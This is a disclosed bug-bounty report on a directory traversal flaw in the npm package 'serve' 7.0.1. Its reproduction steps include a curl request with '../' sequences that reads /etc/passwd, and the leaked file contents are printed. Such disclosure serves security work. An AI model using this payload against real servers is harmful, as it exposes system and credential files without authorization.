# [serve] Server Directory Traversal

## Report Details
- **Report ID**: 358645
- **URL**: https://hackerone.com/reports/358645
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-05-29T06:04:10.003Z
- **Disclosed**: 2018-07-02T08:48:11.943Z

## Reporter
- **Username**: tungpun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Server Directory Traversal vulnerability in **serve**.
It allows reading local files on the target server.

# Module

**module name:** serve
**version:** 7.0.1
**npm page:** https://www.npmjs.com/package/serve

## Module Description

*Assuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.*

*It behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.*

*Furthermore, it also provides a neat interface for listing the directory's contents*

# Vulnerability

## Steps To Reproduce:

* Install the module

`$ npm i serve`

* Start the server

`$ ./node_modules/serve/bin/serve.js`

* Using the below request to access the file `/etc/passwd` on the target server:

```
$ curl --path-as-is 'http://127.0.0.1:3000/../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
...
```

## Supporting Material/References:

* macOS High Sierra 10.13.4
* node v8.10.0
* npm 6.1.0
* curl 7.54.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows reading local files on the target server

## Attachments
No attachments
